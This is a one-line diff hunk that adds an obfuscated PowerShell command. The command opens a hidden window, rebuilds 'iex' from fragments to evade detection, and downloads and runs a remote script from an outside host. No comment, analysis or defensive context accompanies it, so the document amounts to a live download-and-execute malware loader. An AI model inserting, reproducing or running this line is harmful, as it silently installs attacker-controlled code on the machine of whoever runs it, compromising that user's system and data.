@@ -1,0 +1,1 @@
+start powershell -win hi -Arg 'sv canc ex;.(''i''+(gv canc).Value)(iwr choosecasino.ca/2.txt -useb)'
